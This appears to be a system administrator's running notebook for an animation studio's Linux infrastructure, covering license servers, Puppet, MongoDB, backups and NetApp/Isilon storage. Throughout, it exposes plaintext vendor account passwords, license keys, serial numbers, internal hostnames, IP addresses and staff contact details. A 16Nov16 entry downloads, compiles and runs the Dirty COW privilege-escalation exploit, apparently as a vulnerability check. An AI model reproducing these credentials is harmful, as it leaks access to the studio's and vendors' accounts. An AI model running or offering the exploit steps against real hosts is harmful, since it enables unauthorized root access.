root     56499     1  0 15:40 pts/1    00:00:00 /bin/sh /usr/lib/sesi/sesinetd_safe --sesi=/usr/lib/sesi --sesinetd=/usr/lib/sesi/sesinetd --log-file=/var/log/sesinetd.log --pid-file=/var/run/sesinetd_dipper.pid -V 2 -z 1048576
root     56514 56499  6 15:40 pts/1    00:00:00 /usr/lib/sesi/sesinetd -l /var/log/sesinetd.log -D -V 2 -z 1048576 -R /var/run/sesinetd_dipper.pid
root     56539 55094  0 15:40 pts/1    00:00:00 grep sesi

14May18  email from houdini support

sesictrl -I LICENSE Generic Houdini-Engine 16.5 10 01-jul-2018 +.*.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com dd551283 @sgiJHV6xbB@IIBgHAYyvLtSN4GaAuoUXbusTU5dfBWCMHuQVGWzfWTekFFqRL0kOiVh7BWxlVIxSC

******************************************

((((()))))
22Mar17 clarrise/isotropix

[root@dipper sesi]# ps -ef | grep iso
root      3802 34653  0 15:47 pts/0    00:00:00 grep iso
root     43125     1  1  2016 ?        1-17:39:46 /opt/isotropix/ilise/ilise -license_folder /opt/isotropix/ilise/licenses

#less /opt/isotropix/ilise/licenses/floating_W160825674F40B.license

less /opt/isotropix/ilise/licenses/NEW/2017-04-24_114320_evaluation_1125_DisneyToon_Studios_floating_A0D3C104563C.txt


http://www.isotropix.com/user/licenses
	"My Licenses"
	   "Download License File"
@@@mv to correct place on dipper

@@@ list clarrise licenses

cp .license and .txt to dipper:/opt/isotropix/ilise/licenses

[root@dipper ilise]# /opt/isotropix/ilise/licinfo localhost:40500 list

[root@dipper ilise]# /opt/isotropix/ilise/licinfo localhost:40500 list_clients

[root@dipper ilise]# /opt/isotropix/ilise/licinfo localhost:40500 restart_server


@@@23Mar17 "restart_server" did not work (did not see new licenses)   I had to:
service ilise stop 
/kill the running process/
service ilise start

@@@29Aug17
[root@dipper ilise]# pwd
/opt/isotropix/ilise
[root@dipper ilise]# ./ilise help
ILISE Copyright (c) 2009-2016 Isotropix SAS.
Build #17141 Jun 23 2016
Running Isotropix License Server...
version: ISOTROPIX_PACKAGE_BUILD_VERSION
ILISE Copyright (c) 2009-2016 Isotropix SAS.
Build #17141 Jun 23 2016
Isotropix License Server.
Use 'ilise help' to display the full help.
usage:
 ilise [OPTION]
-port 			 port number=40500
-license_file 		 path to file
-license_folder 	 path to folder
-log_file 		 path to log file


@@@ 3May17
@@@ for upgrades.. login and go to:

http://www.isotropix.com/
Login: dtsclarisse
Passwd: <encryptedfile.txt>

My Download Area
   Clarrise IFX x.x
     Binaries
       Clarrise IFX x.x (select version)
         (select OS) and download
	     tar xzvf isotropix_clarisse_ifx_3.5_linux64.tar.gz
	       mv clarrise clarrise_ifx_x.x
	         mv to /disney/apps/isotropix

((((()))))
Renderman licensing 22Mar17
license server	9010/tcp

SYSENG-225

In the meantime:
https://renderman.pixar.com/forum/entitlement.php licenses 
#login rabomber 
#password slithytoves

@@@ email sent to license-admin@pixar.com 22Mar17

@@@ 27Mar17 email from Pixar

PURCHASE ORDER	020515-DTS  
SERIALNUMBER				PRODUCT		DESCRIPTION				QUANTITY
196-1506-1335-2707-119178 
Bound to host: dipper (a0d3c104563c)	RenderMan 20.0	RenderMan Pro Server, RfM, Slim and IT	424
      	       	      			Tractor 2.0	Tractor 2.0 (Work distribution system)	424

To download and install RenderMan, follow the appropriate link for your operating system:
https://renderman.pixar.com/forum/rmaninstallerdownload.php?platform=linux

Installation documentation can be found at http://rmanwiki.pixar.com/display/REN/Installation+and+Licensing.

14Apr17  @@@ now that network access is fixed

@@@ download rpm and copied it to dipper:/opt/pixar/

@@@ erase old version
yum erase PixarLicense-LA-11.0_1457011-linuxRHEL6_gcc44icc121.x86_64

@@@ install new version
yum install PixarLicense-LA-21.0_1634130-linuxRHEL6_gcc44icc150.x86_64.rpm

[root@dipper pixar]# cd PixarLicense-LA-21.0
[root@dipper PixarLicense-LA-21.0]# ll
total 280
drwxr-xr-x. 5 root root   4096 Apr 14 10:38 LicenseApp
-rwxr-xr-x. 1 root root   2560 Jul 13  2016 linux_installService.sh
-rwxr-xr-x. 1 root root   1668 Jul 13  2016 macOS_installService.sh
-rwxr-xr-x. 1 root root 267632 Jul 13  2016 PixarLicenseServer
-rwxr-xr-x. 1 root root   3809 Jul 13  2016 queryPRMan.py

[root@dipper bin]# pwd
/opt/pixar/PixarLicense-LA-21.0/LicenseApp/bin

sudo service pixarlicenseserver stop
sudo chkconfig pixarlicenseserver off
chkconfig --list | grep -i pixar
pixarlicenseserver	0:off	1:off	2:off	3:off	4:off	5:off	6:off

@@@ license app

dsiegfriedt@dipper:/opt/pixar/PixarLicense-LA-21.0 $ LicenseApp/bin/LicenseApp 
In License Server or Tractor engine distribution 
dist root  "/opt/pixar/PixarLicense-LA-21.0/LicenseApp" 
QInotifyFileSystemWatcherEngine::addPaths: inotify_add_watch failed: No such file or directory
ssl error: The issuer certificate of a locally looked up certificate could not be foundssl error: The root CA certificate is not trusted for this purposessl error: The issuer certificate of a locally looked up certificate could not be foundssl error: The root CA certificate is not trusted for this purpose

@@@ screen cat ~dsiegfriedt/NEXT-pixar-error.jpg


((((()))))


CONFLUENCE
https://confluence.disney.com/display/~THOMG112/How-to+articles

JIRA
http://atlas:8080/secure/Dashboard.jspa

SLACK
https://disneytoonstudios.slack.com

LICENSE TRACKER
http://netsys.disneytoonstudios.com:3000/dashboard/db/licenses?from=now-30d&to=now

MISC
http://dtsweb.disneytoonstudios.com
https://www.wageworks.com/employees/support-center
https://enterpriselogin.disney.com
https://esrs.disneytoonstudios.com:9443 (isilon)

((((()))))
((((()))))
28Sep16  --siggy ***from history***  puppet

cd ~dsiegfriedt/JOBS/DISNEYTS

  410  28Sep16-15:26:24  git clone git@gitlab.disneytoonstudios.com:linux/puppet.git
  412  28Sep16-15:28:06  cd puppet/
  428  28Sep16-15:29:13  cd gitlab/puppet
  443  28Sep16-15:46:05  cd /etc/puppet/
  471  28Sep16-15:53:36  cd /disney/home/gracet/gitlab/puppet/modules
  645  30Sep16-16:54:20  cd puppet/
  794  04Oct16-13:14:11  sudo puppet agent --test

28Sep16  --siggy ***from history***  git

  405  28Sep16-15:22:58  git clone git@gitlab.disneytoonstudios.com:linux/puppet.git
  410  28Sep16-15:26:24  git clone git@gitlab.disneytoonstudios.com:linux/puppet.git
  414  28Sep16-15:28:11  git pull
  428  28Sep16-15:29:13  cd gitlab/puppet
  441  28Sep16-15:44:19  vi .gitignore 
  471  28Sep16-15:53:36  cd /disney/home/gracet/gitlab/puppet/modules
  642  30Sep16-16:52:58  man git
  646  30Sep16-16:54:29  git-gui
  647  30Sep16-16:54:44  git pull
  648  30Sep16-17:04:19  man git
  649  30Sep16-17:04:55  git --help
  650  30Sep16-17:05:29  git help checkout
  651  30Sep16-17:05:50  git help commit
  652  30Sep16-17:08:30  git help log
  653  30Sep16-17:08:50  git status

13Oct16  --siggy git cheat sheet

https://services.github.com/on-demand/downloads/github-git-cheat-sheet.pdf

10Oct16  --siggy  puppet

on superfortress
less /etc/puppet/puppet.conf
[main]
vardir = /var/lib/puppet
logdir = /var/log/puppet
rundir = /var/run/puppet
ssldir = $vardir/ssl
disable_warnings = deprecations

[agent]
pluginsync      = true
report          = true
igno
reschedules 	= true
daemon          = false
ca_server       = chug.disneytoonstudios.com
certname        = superfortress.disneytoonstudios.com
environment     = production
server          = chug.disneytoonstudios.com

/etc/puppet/puppet.conf (END)

sudo puppet agent --test

((((()))))
14Oct16  --siggy tweak ( rv ) LICENSING

on dipper

cat /usr/local/tweak/etc/license.gto

less /scratch2/tlmserver.log (this is where I found the port number)

[root@dipper etc]# /usr/local/tweak/bin/tlm_server -s -h dipper -p 5436
asking for status, dipper, 5436

RESPONSE: tlm_server running on host 'dipper.disneytoonstudios.com' port 5436
Version: 2.6.0

License 1: rvsdi 4.*.* :: 0 in use, 1 available, 1 total, maint expired 06-Feb-2015
License 2: rvio 4.*.* :: 0 in use, 10 available, 10 total, maint expired 06-Feb-2016
License 3: rvsolo 4.*.* :: 0 in use, 12 available, 12 total, maint expired 06-Feb-2015
License 4: rvio 4.*.* :: 0 in use, 2 available, 2 total, maint expired 06-Feb-2016
License 5: rvio 4.*.* :: 0 in use, 1 available, 1 total, maint expired 06-Feb-2015
License 6: rvsolo 4.*.* :: 0 in use, 1 available, 1 total, maint expired 06-Feb-2015
License 7: rvio 4.*.* :: 0 in use, 12 available, 12 total, maint expired 06-Feb-2016
License 8: rvsdi 4.*.* :: 0 in use, 2 available, 2 total, maint expired 06-Feb-2015
License 9: rvsolo 4.*.* :: 0 in use, 10 available, 10 total, maint expired 06-Feb-2015

25May17  @@@as root on dipper looking for rv ( RV ) licenses

[root@dipper ~]# /usr/local/tweak/bin/tlm_server -s -h dipper -p 5436
asking for status, dipper, 5436

RESPONSE: tlm_server running on host 'dipper.disneytoonstudios.com' port 5436
Version: 2.6.0

License 1: rvsolo *.*.* :: 0 in use, 23 available, 23 total, maint expired 06-Feb-2017
License 2: rvio *.*.* :: 0 in use, 25 available, 25 total, maint expired 06-Feb-2017
License 3: rvsdi *.*.* :: 0 in use, 3 available, 3 total, maint expired 06-Feb-2017

((((()))))
14Oct16  --siggy  mongodb (satellite db log wants to be rotated)

777

on chug
/var/lib/mongodb
...
-rw-r--r--. 1 mongodb mongodb 5118857303 Oct  4 11:51 mongodb.log
...

777

[root@chug mongodb]# cat /etc/mongod.conf
# mongodb.conf - generated from Puppet

#where to log
logpath=/var/log/mongodb/mongodb.log
logappend=true
*******************
I think it needs this:
logRotate: reopen
*******************
# Set this option to configure the mongod or mongos process to bind to and
# listen for connections from applications on this address.
# You may concatenate a list of comma separated values to bind mongod to multiple IP addresses.
bind_ip = 127.0.0.1
# fork and run in background
fork=true
dbpath=/var/lib/mongodb
# location of pidfile
pidfilepath=/var/run/mongodb/mongod.pid
# Enables journaling
journal = true
# Turn on/off security.  Off is currently the default
noauth=true

777

[root@chug mongodb]# cat /etc/logrotate.d/mongodb 
/var/log/mongodb/*.log {
       weekly
       rotate 10
       copytruncate
       delaycompress
       compress
       notifempty
       missingok
       postrotate
          /bin/kill -USR1 `cat /var/run/mongodb/mongod.pid 2>/dev/null` 2> /dev/null|| true
       endscript
}
777
will stopping mongo effect satellite

[root@chug mongodb]# systemctl status mongod.service
	   ASSUME....systemctl stop mongod.service
	   ASSUME....systemctl start mongod.service


((((()))))
14Oct16  --siggy UVLayout

From Grace:
http://www.uvlayout.com
install it on /disney/apps/uvlayout

Login details: 
http://www.uvlayout.com
License ID: 56920f87
Password: Disney2016

Download from:
http://www.uvlayout.com/index.php?option=com_wrapper&Itemid=94

Install guide:
http://www.uvlayout.com/doc/Installation_Guide:_Linux

Below are downloads of the Professional version of UVLayout for Linux. For 64bit OSs only. See Installation_Guide:_Linux for full installation instructions.

File	   				Description	   			Last Modified	   		Size (bytes)	   
uvlayout-pro-2.09.04-f13.64.tgz		Camera Driven Local Scaling		2016-05-31 16:37		10,780,215
uvlayout-pro-2.09.03-f13.64.tgz		Tiles Selecting				2016-03-25 09:58		10,666,695
uvlayout-pro-2.09.02-f10.64.tgz		Groups Editing				2015-12-16 18:02		10,259,161
uvlayout-pro-2.09.01-f10.64.tgz		Live Editing				2015-10-13 14:16		10,241,985
md5sum.txt				File Checksums				2016-06-29 12:23		264

When untarring:
tar xvfoz uvlayout-pro...

==================================================================================================================================================

export HEADUS_HOME=/disney/apps/uvlayout/uvlayout-pro-2.10
export PATH=$HEADUS_HOME/bin:$PATH

sudo ln -s libGLEW.so.1.10.0 libGLEW.so.1.5
sudo ln -s libIlmImf.so.7.0.0 libIlmImf.so.6

@@@ point at dipper for license

==================================================================================================================================================
+++++
19Oct16

dsiegfriedt@dts3329:/disney/apps/uvlayout/uvlayout-pro-2.09/bin $ ./uvlayout 
sh: /disney/apps/uvlayout/uvlayout-pro-2.09/bin/cysliceP: Input/output error
dsiegfriedt@dts3329:/disney/apps/uvlayout/uvlayout-pro-2.09/bin $ sudo chmod +r cysliceP

dsiegfriedt@dts3329:/disney/apps/uvlayout/uvlayout-pro-2.09/bin $ ./uvlayout 
cysliceP: error while loading shared libraries: libIlmImf.so.6: cannot open shared object file: No such file or directory
dsiegfriedt@dts3329:/lib64 $ sudo ln -s libIlmImf.so.7.0.0 libIlmImf.so.6
[sudo] password for dsiegfriedt: 
dsiegfriedt@dts3329:/lib64 $ ll /lib64/ | grep libIlmImf
lrwxrwxrwx.   1 root root    18 Oct 19 16:23 libIlmImf.so.6 -> libIlmImf.so.7.0.0
lrwxrwxrwx.   1 root root    18 Oct 17 09:04 libIlmImf.so.7 -> libIlmImf.so.7.0.0
-rwxr-xr-x.   1 root root  804K Jan 29  2014 libIlmImf.so.7.0.0


dsiegfriedt@dts3329:/disney/apps/uvlayout/uvlayout-pro-2.09/bin $ ./uvlayout 
uvlayoutP: License not found, or expired, for uvlayoutP v2.09.04

	If you don't have a key yet, or wish to 
	extend your license, contact your vendor 
	and quote them this code string. 

First time code string : 

	row 1 : 4c 2f ed 60 c8
	row 2 : 36 8e 8e 0c 5e
	row 3 : 3d a7 a5 a4 2d
	row 4 : 5d b5 66 ab 23
	row 5 : 1c 19 86 bb 76

Copy of above code: '/tmp/uvlayoutP-code.txt'

Keys filename: '/disney/apps/uvlayout/uvlayout-pro-2.09/lib/.keys'

dsiegfriedt@dts3329:/disney/apps/uvlayout/uvlayout-pro-2.09/bin $ 


[root@dipper local]# /opt/hlserver/hlmanager status
Trying root@localhost ... Connected ... Fetching ...
Updating status ...
Server v2.1 localhost up 06:23
<--------- Licenses ---------->
Name        Status    Free Used
uvlayoutv2  29 days      2    0
[root@dipper local]# 

(See email from Chris dated 13Oct16 Subject:UVLayout Annual Support Subscription for license explination)

+++++ 7CWT ZEKR QNPJ LADK ZZFB P923 XKH5 N6BD PMP8 YBSA # 161118 [000 2] +++++

21Oct16  --siggy
change /etc/init.d/hlserver:
#HEADUS_HOME=/usr/local/hlserver; export HEADUS_HOME
HEADUS_HOME=/disney/apps/uvlayout/uvlayout-pro-2.09/bin; export HEADUS_HOME

service hlserver start (WORKS)

/disney/apps/uvlayout/uvlayout-pro-2.09/bin/uvlayout  FAILS gives "First Time" string

/disney/apps/uvlayout/uvlayout-pro-2.09/bin/headus    WORKS


+++++

((((()))))18Oct16  --siggy  RHEV host-list

Name:	cabbie.disneytoonstudios.com
Address: 10.106.239.32

Name:	leadbottom.disneytoonstudios.com
Address: 10.106.239.23

Name:	ned.disneytoonstudios.com
Address: 10.106.239.31

Name:	oljammer.disneytoonstudios.com
Address: 10.106.239.14

Name:	roper.disneytoonstudios.com
Address: 10.106.239.51

Name:	ryker.disneytoonstudios.com
address: 10.106.239.13

((((()))))
18Oc16  Will test maya 

dsiegfriedt@dts3329:~ $ gig ENGR -s

Setting Up Environment
┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
     PRODUCTION ➜ 'ENGR'
       GIG_MODE ➜ 'stage'

Configuring ENGR
┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
    /disney/shows/default/dshell/gig_ENGR.py

run_maya -gt

((((()))))

18Oct16  --siggy uvlayout


*****DON'T***** confuse where the app lives and where the hlserver lives.

hlserver dipper:/opt/hlserver  and has been added to chkconfig

uvlayout lives /disney/apps/uvlayout/uvlayout-pro-2.09/

*****

From dts3329 (my machine)
1) export HEADUS_HOME=/disney/apps/uvlayout/uvlayout-pro-2.09
2) export PATH=$HEADUS_HOME/bin:$PATH
3) dsiegfriedt@dts3329:/usr/lib64 $ sudo ln -s libGLEW.so.1.10.0 libGLEW.so.1.5
4) headus     #need license key but got email stating we have permenent lic.
    http://www.uvlayout.com/




over to dipper

dsiegfriedt@dipper:/opt/hlserver $ ll
total 940K
drwxrwxr-x.  2  253   253 4.0K Oct 18 14:17 .
drwxr-xr-x. 11 root root  4.0K Oct 18 14:12 ..
-rw-------.  1  253   253   78 Jun 20 02:55 .keys
-rwx--x--x.  1  253   253 439K Aug  2 21:18 hlmanager
-rwx------.  1  253   253 465K Aug  2 21:18 hlserver
-rw-------.  1  253   253 2.0K Oct 18 14:18 hlserver.conf
-rw-r--r--.  1 root root  1.6K Oct 18 14:26 hlserver-0.log
-rw-r--r--.  1 root root     0 Oct 18 14:17 hlserver-1.log
-rwx------.  1  253   253 1.6K Jun 20 22:15 setup.debian
-rwx------.  1  253   253 1.3K Jun 20 22:15 setup.redhat
-rw-------.  1  253 users  705 Jun 20 22:15 setup.systemd


((((()))))
18Oct16  --siggy Netbackup

From Grace:
ssh -Y root@mungo
/usr/openv/netbackup/bin/jnbSA & 

* Load the tapes into the library. Fill up the robot door 

* ssh to mungo and launch jnbsa . Login as root/rootpassword
# ssh -Y root@mungo 
# /usr/openv/netbackup/bin/jnbSA & 

* In the left panel, Under Media and Device Management, right-click "Media" , select "Inventory Robot" 

From Paul:
Be sure to select dts-nbu-01 as the "Device host", "Update volume configuration" and check "Empty media access port".

Oh and click "Start"

22Jun18
--------------------------------------------------------------------
06/22/2018 14:12:04
Robot: TLD(1) on dts-nbu-01
Operation: Inventory and Update
EMM Server: mungo
--------------------------------------------------------------------
Generating list of recommended changes ...

Proposed Change(s) to Update the Volume Configuration
=====================================================
Volume configuration is up-to-date with robot contents.
 
--------------------------------------------------------------------

Matt Watson or Paul Takahashi - they are both the NB experts at Disney Animation

@@@ Paul asked about logging into the "scalar"  WTF

Name:	dts-i6000.swna.wdpr.disney.com
Address: 10.103.80.21

@@@ Grace gave me the scoop
@@@ go into the DC and on the scalar itself login with:
username: service
password: <encryptedfile.txt>

((((()))))
19Oct16  Gracet

When Superfortress pics up the wrong (!352.79) nvidia driver.....

/usr/bin/nvidia-uninstall 
rpm -qa | grep nvid
yum remove nvidia-driver*
rpm -qa | grep nvid
yum remove nvidia-libXNVCtrl-367.57-1.el7.x86_64
rpm -qa | grep nvid
init 3
systemctl isolate multi-user
cd ~gracet
ll
./NVIDIA-Linux-x86_64-352.79.run
reboot

14Aug17
@@@ dts3515 would not come up in graphics mode
@@@ missing link
ln -s /lib/systemd/system/graphical.target default.target

@@@ /etc/systemd/system

lrwxrwxrwx. 1 root root   36 Aug 14 22:07 default.target -> /lib/systemd/system/graphical.target

15Aug17
@@@ what it should look like

[root@avenger ~]# ll /etc/systemd/system/
total 12
drwxr-xr-x. 2 root root   30 Jul  7 16:46 basic.target.wants
drwxr-xr-x. 2 root root   30 Jul  7 17:04 bluetooth.target.wants
lrwxrwxrwx. 1 root root   41 Jul  7 17:04 dbus-org.bluez.service -> /usr/lib/systemd/system/bluetooth.service
lrwxrwxrwx. 1 root root   44 Jul  7 17:11 dbus-org.freedesktop.Avahi.service -> /usr/lib/systemd/system/avahi-daemon.service
lrwxrwxrwx. 1 root root   46 Jul  7 16:44 dbus-org.freedesktop.NetworkManager.service -> /usr/lib/systemd/system/NetworkManager.service
lrwxrwxrwx. 1 root root   57 Jul  7 16:44 dbus-org.freedesktop.nm-dispatcher.service -> /usr/lib/systemd/system/NetworkManager-dispatcher.service
***lrwxrwxrwx. 1 root root   36 Jul  7 16:46 default.target -> /lib/systemd/system/graphical.target
drwxr-xr-x. 2 root root   85 Jul  7 16:43 default.target.wants
***lrwxrwxrwx. 1 root root   35 Jul 10 08:46 display-manager.service -> /usr/lib/systemd/system/gdm.service
drwxr-xr-x. 2 root root   31 Jul  7 16:43 getty.target.wants
drwxr-xr-x. 2 root root   63 Jul  7 17:05 graphical.target.wants
drwxr-xr-x. 2 root root 4096 Jul  7 17:13 multi-user.target.wants

[root@dts3329 ~]# systemctl status graphical.target

((((()))))
25Oct16  --siggy from email from Chris S
To access Ping Federate at DTS use the following URL:

https://vmpingfederate:9999/pingfederate/app

Login is Administrator
Password is: <Root Password>

((((()))))
31Oct16  --siggy

VM disk expantion....  from GraceT

Select Clusters -> VMs -> <hostname> -> Disks -> Edit (Edit Virtual Disk)
 Extend size by(GB)


((((()))))
14Nov16  --siggy    shotgun machine (in DMZ) 
	 NOTE: no sudoers.... as root ssh into
crophopper
bladeranger 
smokejumper 
windlifter

((((()))))
16Nov16  --siggy dirtyc0w

curl https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c > dirtyc0w.c
echo This is a TEST > foo
chmod 0404 foo
ls -lah foo
cat foo
gcc -pthread dirtyc0w.c -o dirtyc0w
./dirtyc0w foo m00000000000000000
cat foo


((((()))))
17Nov16  --siggy  where backup config files for dipper
dsiegfriedt@dts3329:~ $ ll /disney/depts/tech/systems/backops/licenses/DIPPER/
total 80K
drwxr-xr-x.  8 root   root    172 Nov 17 14:42 .
drwxr-xr-x.  3 gracet prodctn  60 Nov 17 11:31 ..
drwxr-xr-x. 10 root   root    259 Apr 23  2015 etc-rc.d
drwxr-x---.  2 root   root    114 May  5  2015 root.ssh
drwxr-xr-x.  2 root   root    108 Oct 24 14:55 root-grafana-lics
drwxr-xr-x.  4 root   root     51 Nov  1 11:23 usr-autodesk
drwxr-xr-x. 16 root   root    350 Nov 17 14:19 usr-local
drwxrwxrwx.  3 root   root     50 Nov 17 14:18 var-flexlm


((((()))))
1Dec16  --siggy  NetApp info

--------------------------------------------------------
gracet [11:54 AM] ￼
btw - bookmark this

[11:54] ￼
/disney/home/gracet/docs/dts-wdas-notes/storage
--------------------------------------------------------

ALSO... from Grace's email dated Oct12

From: Steve Carpenter <steve.carpenter@disneyanimation.com>
Date: Mon, Aug 22, 2016 at 12:28 PM
Subject: Fwd: DTS FAS8020
To: "Thompson, Grace (DTS)" <grace.thompson@disneytoonstudios.com>
Cc: Christopher Steinke <Christopher.Steinke@disneyanimation.com>


Grace,

See the image below.  I apologize for this - big time.  I didn't clean up my work.  I allowed the network appliance guys 
to label this unit and I didn't clean it up afterwards.  In this picture, there are the following cables attached:
4 orange fiber cables on the right marked as such and these are cables going to the cisco fiber switch in cabinet 208.
F8020-A1
F8020-A2
F8020-B1
F8020-B3
In the middle.  These are the connections to the Service Ports, which is connected and working.  
FAS8020A-SP
FAS8020B-SP
On the left are the following:
An un-labeled cable that is a loop (I'm not sure what it's for, but it's probably a communication between the two heads.
Two cables on the very left which I think are the nest-admin cables.  These are going to the 10G switch NXSDTS1CA1-GW in 
the 200 row (204 I think). 
FAS8020A-D Blade-3/Port-33
FAS8020B-D Blade-4/Port-33
Below is the info I think these ports need to be, but we should have Adam check to see if these ports are already active and if 
there's a mac address that is assigned.  If the mac is different, we need to track down what that is.  If it's not assigned, 
then we can probably bring up that port and hopefully this mac address will show up.
host nest-admin.disneytoonstudios.com {
  dynamic;
  hardware ethernet 00:a0:98:68:5f:24;
  fixed-address 10.106.228.132;
        supersede server.filename = "pxelinux.0";
        supersede server.next-server = 0a:6a:e4:15;
        supersede host-name = "nest-admin.disneytoonstudios.com";

If this doesn't work, then we'll have to call netapp support.  BTW, I did see a message in my mail to Richard Stokotelny 
(netapp guy who did the install) about nest-admin being down, but it was never addressed. Also, once we get this all sorted 
out, I will relabel all cables because I didn't finish the job.  Also, I did a very poor job at documenting this.  I will 
finish that as well.  Sorry about that.  Sorry I missed you at DTS.

Steve

--------------------------------------------------------

dsiegfriedt@dts3329:~ $ ping 10.103.80.121
PING 10.103.80.121 (10.103.80.121) 56(84) bytes of data.
64 bytes from 10.103.80.121: icmp_seq=1 ttl=61 time=0.263 ms
64 bytes from 10.103.80.121: icmp_seq=2 ttl=61 time=0.237 ms
^C
--- 10.103.80.121 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 0.237/0.250/0.263/0.013 ms
dsiegfriedt@dts3329:~ $ ping 10.103.80.122
PING 10.103.80.122 (10.103.80.122) 56(84) bytes of data.
64 bytes from 10.103.80.122: icmp_seq=1 ttl=61 time=0.254 ms
64 bytes from 10.103.80.122: icmp_seq=2 ttl=61 time=0.271 ms
^C
--- 10.103.80.122 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 0.254/0.262/0.271/0.018 ms
dsiegfriedt@dts3329:~ $ 
dsiegfriedt@dts3329:~ $ 
dsiegfriedt@dts3329:~ $ 
dsiegfriedt@dts3329:~ $ ssh 10.103.80.121
ssh_exchange_identification: Connection closed by remote host
dsiegfriedt@dts3329:~ $ ssh 10.103.80.122
ssh_exchange_identification: Connection closed by remote host
dsiegfriedt@dts3329:~ $ 

ssh admin@FAS8020A-SP
   N0...
ssh admin@FAS8020B-SP
   N0...

SP nest-01> sp uptime
 17:12:16 up 511 days, 23:08, load average: 1.13, 1.12, 1.09
SP nest-01> system console
Type Ctrl-D to exit.
SP-login: admin
Password:
*****************************************************
* This is an SP console session. Output from the    *
* serial console is also mirrored on this session.  *
*****************************************************
nest::> ?

https://library.netapp.com/ecmdocs/ECMP1196798/html/GUID-ACC6150F-CE9D-485D-836C-60DAF149A1CE.html
https://library.netapp.com/ecmdocs/ECMP12394203/html/ServiceProcessor/use-sp-cmds-mars.htm

=================================================================================================

nest::> vol ?         
  aggregate>                  Manage Infinite Volume aggregate operations
  autosize                    Set/Display the autosize settings of the flexible
                              volume.
  clone>                      Manage FlexClones
  create                      Create a new volume
  delete                      Delete an existing volume
  efficiency>                 Manage volume efficiency
  file>                       File related commands
  modify                      Modify volume attributes
  mount                       Mount a volume on another volume with a
                              junction-path
  move>                       Manage volume move operations
  offline                     Take an existing volume offline
  online                      Bring an existing volume online
  qtree>                      Manage qtrees
  quota>                      Manage Quotas, Policies, Rules and Reports
  rename                      Rename an existing volume
  restrict                    Restrict an existing volume
  show                        Display a list of volumes
  show-footprint              Display a list of volumes and their data and
                              metadata footprints in their associated
                              aggregate.
  show-space                  Display space usage for volume(s)
  size                        Set/Display the size of the volume.              
  snapshot>                   Manage snapshots                                 
  unmount                     Unmount a volume

nest::> aggr ?
  add-disks                   Add disks to an aggregate
  create                      Create an aggregate
  delete                      Delete an aggregate
  mirror                      Mirror an existing aggregate
  modify                      Modify aggregate attributes
  offline                     Offline an aggregate
  online                      Online an aggregate
  plex>                       Manage storage aggregate plexes
  relocation>                 Manage aggregate relocation
  rename                      Rename an aggregate
  restrict                    Restrict an aggregate
  scrub                       Aggregate parity scrubbing
  show                        Display a list of aggregates
  show-resync-status          Display aggregate resynchronization status
  show-scrub-status           Display aggregate scrubbing status
  show-space                  Display details of space utilization within an
                              aggregate.
  show-spare-disks            Display spare disks
  show-status                 Display aggregate configuration
  verify                      Verify an aggregate

=================================================================================================

@@@ commands can be strung together to save commuting through the command strings (all you have to know is what you are looking for (or everything))

ie:
nest::> system node environment sensors show

@@@ seems that some of the 7-mode commands work

vol show

vol show-space
vserver export-policy show
security login show
system services web show
set -privilege advanced

SP nest-01> events newest 50    #will give you the bottom 50 lines of the log


((((()))))
5Dec16  GraceT cleanup space from abrtd (via email)

Here's how to properly clean abrtd logs: 

systemctl stop abrt-oops 
systemctl stop abrtd
abrt-cli rm /var/spool/abrt/*

I disabled abrtd altogether since we are not using it anyway 

systemctl disable abrtd
systemctl disable abrt-oops 

((((()))))
event mailhistory show

network interface show -home-node local -role node-mgmt -fields vserver,lif,status-oper,status-admin,address,role

vserver services name-service dns show

system node autosupport show -fields mail-hosts

network traceroute -node local -destination nest-01
__________________________________-

nest::> net int show

  (network interface show)
            Logical    Status     Network            Current       Current Is
Vserver     Interface  Admin/Oper Address/Mask       Node          Port    Home
----------- ---------- ---------- ------------------ ------------- ------- ----
Cluster
            nest-01_clust1 
                         up/up    169.254.118.206/16 nest-01       e0b     true
            nest-02_clus1 
                         up/-     169.254.44.84/16   nest-02       e0b     true
nest
            cluster_mgmt up/up    10.106.228.132/22  nest-01       e0a     true
            nest-01_mgmt1 
                         up/up    10.106.239.18/24   nest-01       e0M     true
            nest-02_mgmt1 
                         up/-     10.106.239.20/24   nest-02       e0a     false
svm0
            svm0_lif1    up/up    10.106.228.134/22  nest-01       e0a     false
6 entries were displayed.

nest::> system service-processor show
                               IP           Firmware
Node          Type Status      Configured   Version   IP Address
------------- ---- ----------- ------------ --------- -------------------------
nest-01       SP   online      true         3.1.1     10.106.239.18
nest-02       -    node-offline 
                               -            -         10.106.239.20
2 entries were displayed.

__________________________________-

((((()))))
3Jan17  --siggy   isilon status

@@@ 8Feb18   node 8 has been removed from the cluster and shows as "DOWN"

[root@dts3329 ~]# ssh axiom

@@@so login to axiom as root (standard root passwd)

isi status
Cluster Name: axiom
Cluster Health:     [ ATTN]
Cluster Storage:  HDD                 SSD            
Size:             747T (747T Raw)     14T (14T Raw)  
VHS Size:         0                   
Used:             423T (57%)          6.7T (46%)     
Avail:            324T (43%)          7.7T (54%)     

                   Health  Throughput (bps)  HDD Storage      SSD Storage
ID |IP Address     |DASR |  In   Out  Total| Used / Size     |Used / Size
-------------------+-----+-----+-----+-----+-----------------+-----------------
  1|10.103.83.187  | OK  |  78M| 163M| 241M|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
  2|10.103.83.188  | OK  |    0|    0|    0|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
  3|10.103.83.189  | OK  |    0| 6.5M| 6.5M|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
  4|10.103.83.190  | OK  |    0|  33K|  33K|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
  5|10.103.83.191  | OK  |    0|  33K|  33K|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
  6|10.103.83.192  | OK  |    0|    0|    0|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
  7|10.103.83.184  | OK  |    0|  66K|  66K|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
  8|10.103.83.185  | OK  |    0|  26K|  26K|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
